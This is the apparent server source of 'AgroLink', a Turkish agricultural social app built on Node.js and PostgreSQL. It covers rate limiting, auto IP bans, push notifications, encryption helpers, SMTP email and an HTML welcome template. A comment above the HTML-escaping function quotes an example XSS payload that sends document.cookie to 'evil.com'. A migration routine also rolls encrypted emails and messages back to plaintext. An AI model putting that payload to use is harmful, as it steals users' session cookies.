/*
 * =============================================================================
 * AGROLINK SERVER - PostgreSQL v7.0 (MOBİL + WEB)
 * =============================================================================
 * 
 * 🚀 v7 YENİLİKLER:
 *   📱 Native Android (Kotlin/Retrofit) tam desteği
 *   🔌 Socket.IO — gerçek zamanlı mesajlaşma & bildirimler
 *   🔔 FCM Push Notification — Android push bildirimleri
 *   📲 /api/app/version — zorla güncelleme & bakım modu
 *   📲 /api/device-token — FCM token kayıt/silme
 *   🌐 CORS — android:// + null origin (OkHttp) tam desteği
 * 
 * 📦 YENİ npm paketleri:
 *   npm install socket.io firebase-admin
 * 
 * 📄 YENİ .env değişkenleri:
 *   FIREBASE_SERVICE_ACCOUNT_JSON='{...}'  (Firebase Console > Proje Ayarları > Hizmet Hesabı)
 *   APP_LATEST_VERSION=1.0.0
 *   APP_MIN_VERSION=1.0.0
 *   APP_FORCE_UPDATE=false
 *   APP_UPDATE_URL=https://play.google.com/store/apps/details?id=com.agrolink.social.agrolink
 *   MAINTENANCE_MODE=false
 *   MAINTENANCE_MSG=Bakım çalışması yapılıyor.
 * 
 * 🔒 Güvenlik: Helmet, CORS, Rate Limiting, bcrypt, JWT
 * ⚡ Optimize edilmiş sorgular + Connection Pooling
 * 
 * =============================================================================
 */

require('dotenv').config({ path: require('path').join(__dirname, '.env') }); // .env dosyasını yükle — __dirname garantili

const cluster = require('cluster');
const os = require('os');
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const path = require('path');
const fs = require('fs').promises;
const fssync = require('fs');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const sharp = require('sharp');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

// ════════════════════════════════════════════════════════════════════
// 🔒 AUTH RATE LIMITERS — Brute-force & spam koruması
// ════════════════════════════════════════════════════════════════════
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 10,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req, res) => {
        // IP + email/identifier kombinasyonu → daha hassas hedefleme
        const id = (req.body?.identifier || req.body?.email || req.body?.username || '').toLowerCase().trim().slice(0, 50);
        return rateLimit.ipKeyGenerator(req, res) + ':' + id;
    },
    message: { error: 'Çok fazla giriş denemesi. Lütfen 15 dakika sonra tekrar deneyin.' },
    skip: (req) => process.env.NODE_ENV === 'test',
});

const registerLimiter = rateLimit({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 5,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req, res) => rateLimit.ipKeyGenerator(req, res),
    message: { error: 'Çok fazla kayıt denemesi. Lütfen 1 saat sonra tekrar deneyin.' },
    skip: (req) => process.env.NODE_ENV === 'test',
});

const otpLimiter = rateLimit({
    windowMs: 10 * 60 * 1000, // 10 dakika
    max: 5,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req, res) => rateLimit.ipKeyGenerator(req, res),
    message: { error: 'Çok fazla OTP denemesi. Lütfen 10 dakika sonra tekrar deneyin.' },
    skip: (req) => process.env.NODE_ENV === 'test',
});

const forgotPasswordLimiter = rateLimit({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 5,
    standardHeaders: true,
    legacyHeaders: false,
    keyGenerator: (req, res) => rateLimit.ipKeyGenerator(req, res),
    message: { error: 'Çok fazla şifre sıfırlama talebi. Lütfen 1 saat sonra tekrar deneyin.' },
    skip: (req) => process.env.NODE_ENV === 'test',
});

// ════════════════════════════════════════════════════════════════════
// 🔒 GLOBAL SPAM KORUMA — Auto-Ban Sistemi
// ════════════════════════════════════════════════════════════════════
// In-memory violation tracker (cluster'da her worker bağımsız; production'da Redis önerirlir)
const spamViolations = new Map(); // ip → { count, firstViolation }

// Otomatik IP ban — DB'ye yazar (pool henüz tanımlı değil; fn tanımı yeterli, pool startup'ta hazır)
async function recordSpamViolation(ip, reason, pool, threshold = 3) {
    if (!ip || ip === 'unknown') return;
    const now  = Date.now();
    const prev = spamViolations.get(ip) || { count: 0, firstViolation: now };
    prev.count++;
    spamViolations.set(ip, prev);
    console.warn(`[SpamGuard] IP: ${ip} | İhlal #${prev.count} | Sebep: ${reason}`);
    if (prev.count >= threshold) {
        try {
            await pool.query(
                `INSERT INTO banned_ips (ip, reason, "bannedAt")
                 VALUES ($1, $2, NOW())
                 ON CONFLICT (ip) DO NOTHING`,
                [ip, `${reason} — ${prev.count} rate limit ihlali`]
            );
            console.warn(`🚫 [AutoBan] IP BAN'a alındı: ${ip} | ${reason}`);
        } catch (dbErr) {
            console.error('[AutoBan] DB hatası:', dbErr.message);
        }
    }
}

// Ortak limiter factory — auto-ban destekli
function makeSpamLimiter({ windowMs, max, reason, threshold = 3, keyFn }) {
    // keyFn sadece (req) alıyor ama express-rate-limit (req, res) bekliyor.
    // IPv6 doğrulamasını geçmek için: IP bazlı anahtarlar ipKeyGenerator üzerinden,
    // kullanıcı-id bazlı anahtarlar ise IP'ye geri düşmeden doğrudan döner.
    const keyGenerator = keyFn
        ? (req, res) => {
              const userId = req.user?.id;
              // Kullanıcı ID varsa → IP'ye dokunmadan direkt kullan (IPv6 sorunu yok)
              if (userId) return String(userId);
              // Yoksa → ipKeyGenerator ile IPv6-safe IP al
              return rateLimit.ipKeyGenerator(req, res);
          }
        : (req, res) => rateLimit.ipKeyGenerator(req, res);

    return rateLimit({
        windowMs,
        max,
        standardHeaders: true,
        legacyHeaders: false,
        keyGenerator,
        skip: (req) => process.env.NODE_ENV === 'test',
        handler: async (req, res) => {
            let ip = 'unknown';
            try { ip = rateLimit.ipKeyGenerator(req, res) || 'unknown'; } catch (_) {
                ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || 'unknown';
            }
            if (typeof pool !== 'undefined' && pool !== null) {
                recordSpamViolation(ip, reason, pool, threshold).catch(() => {});
            }
            return res.status(429).json({
                success: false,
                error: 'Çok fazla istek gönderildi. Lütfen daha sonra tekrar deneyin.',
                retryAfter: Math.ceil(windowMs / 60000) + ' dakika'
            });
        }
    });
}

// ── Partnership ──────────────────────────────────────────────────────
const partnershipLimiter = makeSpamLimiter({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 5,
    reason: 'Partnership spam',
    threshold: 3,
});

// Partnership IP ban kontrol middleware (banned_ips tablosu)
const checkPartnershipIpBan = async (req, res, next) => {
    const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim();
    if (!ip) return next();
    try {
        const banned = await pool.query(`SELECT id FROM banned_ips WHERE ip = $1 LIMIT 1`, [ip]);
        if (banned.rows.length > 0) {
            console.warn(`[Partnership] Banlı IP erişim girişimi: ${ip}`);
            return res.status(403).json({ success: false, error: 'Erişiminiz kısıtlanmıştır.' });
        }
        next();
    } catch (err) {
        console.error('[checkPartnershipIpBan] DB hatası:', err.message);
        next();
    }
};

// ── Resend Verification — e-posta flood koruması ─────────────────────
const resendVerificationLimiter = makeSpamLimiter({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 3,
    reason: 'Resend-verification spam',
    threshold: 3,
});

// ── Post oluşturma — authenticated spam ──────────────────────────────
const postCreateLimiter = makeSpamLimiter({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 20,
    reason: 'Post-create spam',
    threshold: 5,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Yorum spam ───────────────────────────────────────────────────────
const commentLimiter = makeSpamLimiter({
    windowMs: 5 * 60 * 1000, // 5 dakika
    max: 20,
    reason: 'Comment spam',
    threshold: 5,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Like spam ────────────────────────────────────────────────────────
const likeLimiter = makeSpamLimiter({
    windowMs: 60 * 1000, // 1 dakika
    max: 60,
    reason: 'Like spam',
    threshold: 10,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Follow spam ──────────────────────────────────────────────────────
const followLimiter = makeSpamLimiter({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 50,
    reason: 'Follow spam',
    threshold: 5,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Report spam ─────────────────────────────────────────────────────
const reportLimiter = makeSpamLimiter({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 10,
    reason: 'Report spam',
    threshold: 3,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Search spam ─────────────────────────────────────────────────────
const searchLimiter = makeSpamLimiter({
    windowMs: 60 * 1000, // 1 dakika
    max: 30,
    reason: 'Search spam',
    threshold: 10,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Upload spam ─────────────────────────────────────────────────────
const uploadLimiter = makeSpamLimiter({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 15,
    reason: 'Upload spam',
    threshold: 3,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Store/ürün oluşturma ─────────────────────────────────────────────
const storeLimiter = makeSpamLimiter({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 20,
    reason: 'Store-create spam',
    threshold: 5,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Stories ─────────────────────────────────────────────────────────
const storyLimiter = makeSpamLimiter({
    windowMs: 60 * 60 * 1000, // 1 saat
    max: 30,
    reason: 'Story spam',
    threshold: 5,
    keyFn: (req) => req.user?.id || req.ip || 'unknown',
});

// ── Auth/refresh token flood ─────────────────────────────────────────
const refreshLimiter = makeSpamLimiter({
    windowMs: 15 * 60 * 1000, // 15 dakika
    max: 20,
    reason: 'Token-refresh spam',
    threshold: 5,
});

const compression = require('compression');
const helmet = require('helmet');
const { Pool } = require('pg');
const nodemailer = require('nodemailer');
const ffmpeg     = require('fluent-ffmpeg');
const ffmpegPath = require('ffmpeg-static');

// ── Socket.IO — Gerçek zamanlı mesajlaşma & bildirimler ──────────────────
let socketIo = null;
let io        = null;
try {
    socketIo = require('socket.io');
} catch (_) {
    console.warn('⚠️  socket.io paketi bulunamadı. Gerçek zamanlı özellikler pasif. (npm install socket.io)');
}

// ── Firebase Admin (FCM push bildirimleri) ───────────────────────────────
let firebaseAdmin = null;
try {
    firebaseAdmin = require('firebase-admin');
    if (process.env.FIREBASE_SERVICE_ACCOUNT_JSON) {
        const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_JSON);
        firebaseAdmin.initializeApp({ credential: firebaseAdmin.credential.cert(serviceAccount) });
        console.log('✅ Firebase Admin (FCM) yapılandırıldı');
    } else {
        console.warn('⚠️  FIREBASE_SERVICE_ACCOUNT_JSON .env\'de tanımlı değil. FCM push bildirimleri pasif.');
        firebaseAdmin = null;
    }
} catch (e) {
    console.warn('⚠️  firebase-admin paketi bulunamadı. Push bildirimleri pasif. (npm install firebase-admin)');
    firebaseAdmin = null;
}

// Web Push bildirimleri
let webpush = null;
try {
    webpush = require('web-push');
    if (process.env.VAPID_PUBLIC_KEY && process.env.VAPID_PRIVATE_KEY) {
        webpush.setVapidDetails(
            `mailto:${process.env.VAPID_EMAIL || 'admin@sehitumitkestitarimmtal.com'}`,
            process.env.VAPID_PUBLIC_KEY,
            process.env.VAPID_PRIVATE_KEY
        );
        console.log('✅ Web Push (VAPID) yapılandırıldı');
    } else {
        console.warn('⚠️  VAPID_PUBLIC_KEY / VAPID_PRIVATE_KEY .env\'de tanımlı değil. Push bildirimleri pasif.');
    }
} catch (e) {
    console.warn('⚠️  web-push paketi bulunamadı. Push bildirimleri pasif. (npm install web-push)');
}
// 🔒 Cookie parser — HttpOnly token desteği için
let cookieParser;
try {
    cookieParser = require('cookie-parser');
} catch (_) {
    console.warn('cookie-parser bulunamadi: npm install cookie-parser');
    // Fallback: cookie-parser ile ayni factory imzasi  cookieParser(secret) -> middleware
    cookieParser = function(_secret) {
        return function(req, res, next) {
            req.cookies = req.cookies || {};
            var raw = req.headers.cookie;
            if (raw) {
                raw.split(';').forEach(function(pair) {
                    var idx = pair.indexOf('=');
                    if (idx < 0) return;
                    var key = pair.slice(0, idx).trim();
                    var val = pair.slice(idx + 1).trim();
                    try { req.cookies[key] = decodeURIComponent(val); } catch(e) { req.cookies[key] = val; }
                });
            }
            next();
        };
    };
}

ffmpeg.setFfmpegPath(ffmpegPath);

// ==================== SQLite → PG MİGRASYON (opsiyonel) ====================
// sqlite3 ve sqlite paketleri sadece migrasyon sırasında kullanılır.
// Yüklü değilse migrasyon atlanır, sistem normal çalışır.
let sqlite3Mod, sqliteOpen;
try {
    sqlite3Mod = require('sqlite3').verbose();
    sqliteOpen = require('sqlite').open;
} catch (_) { /* paket yok, migrasyon devre dışı */ }

// ==================== KONFİGÜRASYON ====================

const PORT = process.env.PORT || 3000;

// 🔒 GÜVENLİK: JWT secret'lar ZORUNLU — .env dosyasında tanımlı olmalı
// Eğer tanımlı değilse sunucu kasıtlı olarak başlamaz
if (!process.env.JWT_SECRET || process.env.JWT_SECRET.length < 32) {
    console.error('❌ HATA: JWT_SECRET .env dosyasında tanımlı değil veya 32 karakterden kısa!');
    console.error('   Örnek: JWT_SECRET=' + require("crypto").randomBytes(32).toString("hex"));
    process.exit(1);
}
if (!process.env.JWT_REFRESH_SECRET || process.env.JWT_REFRESH_SECRET.length < 32) {
    console.error('❌ HATA: JWT_REFRESH_SECRET .env dosyasında tanımlı değil veya 32 karakterden kısa!');
    console.error('   Örnek: JWT_REFRESH_SECRET=' + require("crypto").randomBytes(32).toString("hex"));
    process.exit(1);
}

const JWT_SECRET         = process.env.JWT_SECRET;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;
// 🔒 GÜVENLİK: 12 rounds ≈ 250ms/hash (OWASP 2024 tavsiyesi; 10 artık yetersiz)
const BCRYPT_ROUNDS = 12;

// ══════════════════════════════════════════════════════════════════════
// 🔒 VERİTABANI KOL ŞIFRELEME — pgcrypto (AES-256 / OpenPGP simetrik)
// ══════════════════════════════════════════════════════════════════════
// Hangi kolonlar şifreleniyor:
//   users        → email, location, "registrationIp"
//   messages     → content  (özel mesajlar)
//   login_history→ ip
//
// Neden kolon bazlı şifreleme?
//   • DB dosyası çalınsa dahi hassas veriler okunamaz
//   • Disk imajı ele geçirilse dahi e-postalar/mesajlar düz metin değil
//   • DB_ENCRYPTION_KEY olmadan decrypt edilemez
//
// Nasıl çalışıyor?
//   • dbEncrypt(plain)  → pgp_sym_encrypt(plain, KEY) → PostgreSQL'de bytea saklanır
//   • dbDecrypt(cipher) → pgp_sym_decrypt(cipher, KEY) → okunabilir metin
//   • Sorgu: SELECT pgp_sym_decrypt(email, $KEY) AS email FROM users WHERE ...
//
// ⚠️  .env'e ekle:
//   DB_ENCRYPTION_KEY=en_az_32_karakter_rastgele_string
// ══════════════════════════════════════════════════════════════════════

if (!process.env.DB_ENCRYPTION_KEY || process.env.DB_ENCRYPTION_KEY.length < 32) {
    console.error('❌ HATA: DB_ENCRYPTION_KEY .env dosyasında tanımlı değil veya 32 karakterden kısa!');
    console.error('   Hassas veriler şifrelenemez. Sunucu güvenli değil.');
    console.error('   Örnek: DB_ENCRYPTION_KEY=' + require('crypto').randomBytes(32).toString('hex'));
    process.exit(1);
}

const DB_ENCRYPTION_KEY = process.env.DB_ENCRYPTION_KEY || null;

/**
 * Bir değeri pgcrypto ile şifreler.
 * Sorgu içinde kullanım: INSERT INTO users (email) VALUES (dbEncryptExpr())
 * → Parametre olarak: [value, DB_ENCRYPTION_KEY]
 *
 * Kullanım örneği (SQL):
 *   INSERT INTO users (email) VALUES (pgp_sym_encrypt($1, $2))
 *   params: [emailValue, DB_ENCRYPTION_KEY]
 */

// ══════════════════════════════════════════════════════════
// 🔒 HTML ESCAPE — E-posta şablonlarında injection önlemi
// Kullanıcı adı veya içerik HTML'e doğrudan gömülmeden önce
// mutlaka bu fonksiyondan geçirilmeli.
// Örnek saldırı: name = "<script>fetch('evil.com?c='+document.cookie)</script>"
// → Escape edilmezse e-posta istemcisinde çalışır (bazı istemciler HTML render eder)
// ══════════════════════════════════════════════════════════
function escapeHtml(str) {
    if (typeof str !== 'string') return String(str || '');
    return str
        .replace(/&/g,  '&amp;')
        .replace(/</g,  '&lt;')
        .replace(/>/g,  '&gt;')
        .replace(/"/g,  '&quot;')
        .replace(/'/g,  '&#x27;')
        .replace(/\//g, '&#x2F;');
}

function encryptedInsertExpr(paramIndex, keyParamIndex) {
    if (!DB_ENCRYPTION_KEY) return `$${paramIndex}`;
    return `pgp_sym_encrypt($${paramIndex}::text, $${keyParamIndex}::text)`;
}

/**
 * Şifreli kolonu decrypt eden SQL ifadesi.
 * Kullanım (SELECT içinde):
 *   SELECT pgp_sym_decrypt(email, $1) AS email FROM users WHERE id = $2
 *   params: [DB_ENCRYPTION_KEY, userId]
 */
function decryptedSelectExpr(columnName, keyParamIndex) {
    if (!DB_ENCRYPTION_KEY) return columnName;
    return `pgp_sym_decrypt(${columnName}::bytea, $${keyParamIndex}::text) AS "${columnName.replace(/"/g, '')}"`;
}

/**
 * Node.js tarafında şifreleme (DB dışı — token, dosya adı gibi değerler için)
 * AES-256-GCM: authenticated encryption, tampering koruması dahil
 */
function encryptValue(plainText) {
    if (!DB_ENCRYPTION_KEY || !plainText) return plainText;
    try {
        const iv  = crypto.randomBytes(12); // GCM için 12 byte IV
        const key = crypto.createHash('sha256').update(DB_ENCRYPTION_KEY).digest(); // 32 byte key
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
        const encrypted = Buffer.concat([cipher.update(plainText, 'utf8'), cipher.final()]);
        const tag = cipher.getAuthTag();
        // Format: iv(12) + tag(16) + ciphertext → base64
        return Buffer.concat([iv, tag, encrypted]).toString('base64');
    } catch (e) {
        console.error('[ŞİFRELEME] encryptValue hatası:', e.message);
        return plainText;
    }
}

function decryptValue(cipherText) {
    if (!DB_ENCRYPTION_KEY || !cipherText) return cipherText;
    try {
        const buf = Buffer.from(cipherText, 'base64');
        if (buf.length < 29) return cipherText; // 12 iv + 16 tag + 1 min content
        const iv        = buf.slice(0, 12);
        const tag       = buf.slice(12, 28);
        const encrypted = buf.slice(28);
        const key = crypto.createHash('sha256').update(DB_ENCRYPTION_KEY).digest();
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(tag);
        return decipher.update(encrypted) + decipher.final('utf8');
    } catch (_) {
        // Decrypt başarısız = şifrelenmemiş eski değer — olduğu gibi dön (migration uyumluluğu)
        return cipherText;
    }
}

// Hassas kolonların listesi — sorgu oluştururken referans alınır
const ENCRYPTED_COLUMNS = {
    users        : ['email', 'location', 'registrationIp'],
    messages     : ['content'],
    login_history: ['ip'],
};

// DB migration: Mevcut düz metin verileri şifrele (tek seferlik, sunucu başladığında)
async function migrateEncryptSensitiveColumns() {
    // ŞİFRELEME TAMAMEN DEVRE DIŞI:
    // E-posta şifrelenince → isGmailAddress() → "@gmail.com" göremez → 2FA gitmiyor
    // Çözüm: E-posta ve mesaj şifrelemesi YOK, daha önce şifrelendiyse geri al
    console.log('🔓 [DB] Şifrelenmiş e-posta/mesaj rollback başlıyor...');
    try {
        // ── E-postalar: şifrelenmiş olanları tespit et ve geri al ──────
        // pgcrypto bytea çıktısı hex string olarak gelir, @ içermez
        // Normal e-posta mutlaka @ içerir — içermiyorsa şifrelenmiş demektir
        const encryptedEmails = await pool.query(
            `SELECT id FROM users WHERE email NOT LIKE '%@%' AND email IS NOT NULL`
        ).catch(() => ({ rows: [] }));

        if (encryptedEmails.rows.length > 0) {
            if (!DB_ENCRYPTION_KEY) {
                console.warn(`⚠️  [DB] ${encryptedEmails.rows.length} şifreli e-posta var ama DB_ENCRYPTION_KEY yok! Decrypt edilemiyor.`);
            } else {
                await pool.query(`
                    UPDATE users
                    SET email = pgp_sym_decrypt(email::bytea, $1)::text
                    WHERE email NOT LIKE '%@%'
                      AND email IS NOT NULL
                `, [DB_ENCRYPTION_KEY]).catch(e =>
                    console.warn('E-posta decrypt hatası:', e.message)
                );
                console.log(`✅ [DB] ${encryptedEmails.rows.length} e-posta plain text'e döndürüldü`);
            }
        } else {
            console.log('✅ [DB] E-postalar zaten plain text — rollback gerekmedi');
        }

        // ── Mesajlar: şifrelenmiş olanları geri al ────────────────────
        // Şifreli mesaj: boşluk içermez, @ içermez, uzun hex string
        const encryptedMsgs = await pool.query(
            `SELECT COUNT(*) as cnt FROM messages
             WHERE content NOT LIKE '% %'
               AND length(content) > 40
               AND content IS NOT NULL`
        ).catch(() => ({ rows: [{ cnt: 0 }] }));

        const msgCount = parseInt(encryptedMsgs.rows[0]?.cnt || 0);
        if (msgCount > 0 && DB_ENCRYPTION_KEY) {
            await pool.query(`
                UPDATE messages
                SET content = pgp_sym_decrypt(content::bytea, $1)::text
                WHERE content NOT LIKE '% %'
                  AND length(content) > 40
                  AND content IS NOT NULL
            `, [DB_ENCRYPTION_KEY]).catch(() => {});
            console.log(`✅ [DB] ${msgCount} mesaj plain text'e döndürüldü`);
        }

        console.log('✅ [DB] Rollback tamamlandı — hiçbir şey şifrelenmeyecek');
    } catch (e) {
        console.warn('⚠️  [DB] Rollback sırasında hata (kritik değil):', e.message);
    }
}

// ==================== 🌐 MUTLAK URL DÖNÜŞTÜRÜCÜ ====================
// Android/Kotlin uygulaması göreceli path'leri (/uploads/...) çözemez.
// Bu fonksiyon tüm medya URL'lerini tam URL'e çevirir.
const APP_URL = (process.env.APP_URL || 'https://sehitumitkestitarimmtal.com').replace(/\/$/, '');

/**
 * Göreceli bir path'i tam URL'e çevirir.
 * /uploads/profiles/x.jpg → https://domain.com/uploads/profiles/x.jpg
 * Zaten tam URL ise olduğu gibi döndürür.
 */
function absoluteUrl(p) {
    if (!p) return null;
    if (p.startsWith('http://') || p.startsWith('https://')) return p;
    return APP_URL + (p.startsWith('/') ? p : '/' + p);
}

/**
 * Kullanıcı nesnesindeki tüm resim alanlarını mutlak URL'e çevirir.
 */
function formatUserUrls(user) {
    if (!user) return user;
    const u = { ...user };
    if (u.profilePic) u.profilePic = absoluteUrl(u.profilePic);
    if (u.coverPic)   u.coverPic   = absoluteUrl(u.coverPic);
    return u;
}

// ==================== 📧 E-POSTA KONFİGÜRASYONU ====================

// ──────────────────────────────────────────────────────────────────────────────
// 📧 Gmail SMTP Kurulumu (ZORUNLU):
//   1. Gmail → Hesap → Güvenlik → 2 Adımlı Doğrulama: AKTİF
//   2. https://myaccount.google.com/apppasswords → Uygulama: "Posta" → Oluştur
//   3. .env dosyasına ekle (BOŞLUKSUZ, TIRNAK YOK):
//        SMTP_USER=ornek@gmail.com
//        SMTP_PASS=abcdabcdabcdabcd   (16 karakter, boşluk yok)
//   ⚠️  Normal Gmail şifreniz çalışmaz! Uygulama şifresi zorunludur.
// ──────────────────────────────────────────────────────────────────────────────
function getEmailCredentials() {
    const user = (process.env.SMTP_USER || process.env.EMAIL_USER || '').trim();
    // Boşlukları ve tire/nokta dışı özel karakterleri temizle (App Password formatı)
    const pass = (process.env.SMTP_PASS || process.env.EMAIL_PASS || '')
        .replace(/\s+/g, '')   // tüm boşlukları kaldır
        .trim();
    return { user, pass };
}

function createTransporter() {
    const { user, pass } = getEmailCredentials();
    if (!user || !pass) {
        console.warn('⚠️  E-posta devre dışı: SMTP_USER/SMTP_PASS .env dosyasında tanımlı değil');
        console.warn('   → .env dosyanıza şunları ekleyin:');
        console.warn('     SMTP_USER=gmail_adresiniz@gmail.com');
        console.warn('     SMTP_PASS=16haneliharcuygulama şifresi (boşluksuz)');
        return null;
    }
    // Her iki port stratejisini de dene: önce 465 (SSL), hata alırsa 587 (TLS)
    return nodemailer.createTransport({
        host            : 'smtp.gmail.com',
        port            : 465,
        secure          : true,
        auth            : { user, pass },
        connectionTimeout: 10000,
        greetingTimeout  : 10000,
        // 🔒 GÜVENLİK: TLS sertifika doğrulaması aktif (MITM koruması)
        tls             : { rejectUnauthorized: true, servername: 'smtp.gmail.com' },
    });
}

// Transporter'ı önbellekle ama hata durumunda yeniden oluştur
let _emailTransporter = null;
let _emailVerified = false;

function getEmailTransporter() {
    if (_emailTransporter && _emailVerified) return _emailTransporter;
    _emailTransporter = createTransporter();
    return _emailTransporter;
}

// Sunucu başladığında e-posta bağlantısını test et (asenkron, bloke etmez)
async function testEmailConnection() {
    const { user, pass } = getEmailCredentials();
    if (!user || !pass) return;
    const t = createTransporter();
    if (!t) return;
    try {
        await t.verify();
        _emailTransporter = t;
        _emailVerified = true;
        console.log('✅ Gmail SMTP bağlantısı doğrulandı: [SMTP_USER]');
    } catch (err) {
        console.error('❌ Gmail SMTP hatası:', err.message);
        if (err.message.includes('Invalid login') || err.message.includes('Username and Password')) {
            console.error('   ▶ Çözüm: Google Hesap → Güvenlik → Uygulama Şifreleri');
            console.error('   ▶ https://myaccount.google.com/apppasswords');
            console.error('   ▶ Normal Gmail şifreniz çalışmaz, 16 haneli App Password gerekli!');
        }
        // Transporter'ı null yapmıyoruz; yine de denemeye devam eder
        _emailTransporter = t;
        _emailVerified = false;
    }
}

// ─── WEB PUSH BİLDİRİM GÖNDER ───────────────────────────────────────
async function sendPushToUser(userId, { title, body, icon = '/agro.png', url = '/' }) {
    if (!webpush || !process.env.VAPID_PUBLIC_KEY) return;
    try {
        const subs = await dbAll(`SELECT endpoint, keys FROM push_subscriptions WHERE "userId"=$1`, [userId]).catch(() => []);
        for (const sub of subs) {
            try {
                let keys = {};
                try { keys = typeof sub.keys === 'string' ? JSON.parse(sub.keys) : (sub.keys || {}); } catch(_) {}
                const pushSub = { endpoint: sub.endpoint, keys };
                const payload = JSON.stringify({ title, body, icon, url, timestamp: Date.now() });
                await webpush.sendNotification(pushSub, payload).catch(async (err) => {
                    // 410 Gone = abonelik iptal edilmiş, sil
                    if (err.statusCode === 410 || err.statusCode === 404) {
                        await dbRun(`DELETE FROM push_subscriptions WHERE endpoint=$1`, [sub.endpoint]).catch(() => {});
                    }
                });
            } catch(_) {}
        }
    } catch (e) {
        console.error('Push bildirim hatası:', e.message);
    }
}

async function sendEmail(to, subject, html, text = null) {
    const transporter = getEmailTransporter();
    if (!transporter) {
        console.warn('📧 E-posta atlandı (kimlik bilgisi yok):', subject);
        return { success: false, error: 'E-posta yapılandırılmamış' };
    }
    try {
        const mailOptions = {
            from: `Agrolink <${process.env.SMTP_USER || process.env.EMAIL_USER}>`,
            to,
            subject,
            html,
            text: text || html.replace(/<[^>]*>/g, '')
        };
        const info = await transporter.sendMail(mailOptions);
        console.log('📧 E-posta gönderildi: [messageId gizlendi]');
        return { success: true, messageId: info.messageId };
    } catch (error) {
        console.error('❌ E-posta gönderim hatası:', error.message);
        return { success: false, error: error.message };
    }
}

// ─── Şablon 1: Kayıt (Hoş Geldiniz) ────────────────────────────────
function getWelcomeEmailTemplate(userName) {
    userName = escapeHtml(userName);
    const year = new Date().getFullYear();
    const name = userName || 'Değerli Üye';
    return `<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>AgroLink\'e Hoş Geldiniz!</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Plus Jakarta Sans',Segoe UI,sans-serif;background:#060d0a;color:#e8f5e9;-webkit-font-smoothing:antialiased}
  .wrapper{max-width:600px;margin:0 auto;padding:24px 16px}
  /* HERO */
  .hero{background:linear-gradient(135deg,#0a1f10 0%,#0d2b16 40%,#071a0c 100%);border-radius:28px;padding:48px 40px;text-align:center;position:relative;overflow:hidden;border:1px solid rgba(0,230,118,0.15)}
  .hero::before{content:'';position:absolute;top:-60px;left:-60px;width:220px;height:220px;border-radius:50%;background:radial-gradient(circle,rgba(0,230,118,0.18) 0%,transparent 70%)}
  .hero::after{content:'';position:absolute;bottom:-40px;right:-40px;width:160px;height:160px;border-radius:50%;background:radial-gradient(circle,rgba(29,233,182,0.12) 0%,transparent 70%)}
  .logo-box{width:80px;height:80px;border-radius:22px;margin:0 auto 20px;overflow:hidden;border:2px solid rgba(0,230,118,0.3);box-shadow:0 0 0 8px rgba(0,230,118,0.06),0 20px 50px rgba(0,230,118,0.2)}
  .logo-box img{width:100%;height:100%;object-fit:cover}
  .brand{font-size:32px;font-weight:800;background:linear-gradient(135deg,#00e676,#1de9b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:-1px}
  .tagline{font-size:14px;color:rgba(255,255,255,0.5);margin-top:6px;letter-spacing:0.3px}
  .hero-greeting{font-size:22px;font-weight:700;color:#e8f5e9;margin-top:24px;line-height:1.4}
  .hero-greeting span{color:#00e676}
  .hero-sub{font-size:14px;color:rgba(255,255,255,0.55);margin-top:10px;line-height:1.6;max-width:400px;margin-left:auto;margin-right:auto}
  /* CTA */
  .cta-btn{display:inline-block;margin-top:28px;padding:14px 36px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;font-size:15px;border-radius:50px;text-decoration:none;letter-spacing:0.3px;box-shadow:0 8px 32px rgba(0,230,118,0.3)}
  /* FEATURES */
  .section{background:#0a1628;border:1px solid rgba(0,230,118,0.08);border-radius:24px;padding:32px;margin-top:16px}
  .section-title{font-size:16px;font-weight:700;color:#00e676;margin-bottom:20px;letter-spacing:0.2px}
  .feature-item{display:flex;align-items:flex-start;gap:14px;padding:14px 0;border-bottom:1px solid rgba(255,255,255,0.04)}
  .feature-item:last-child{border-bottom:none;padding-bottom:0}
  .feature-icon{width:42px;height:42px;border-radius:12px;background:linear-gradient(135deg,rgba(0,230,118,0.15),rgba(29,233,182,0.08));border:1px solid rgba(0,230,118,0.15);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
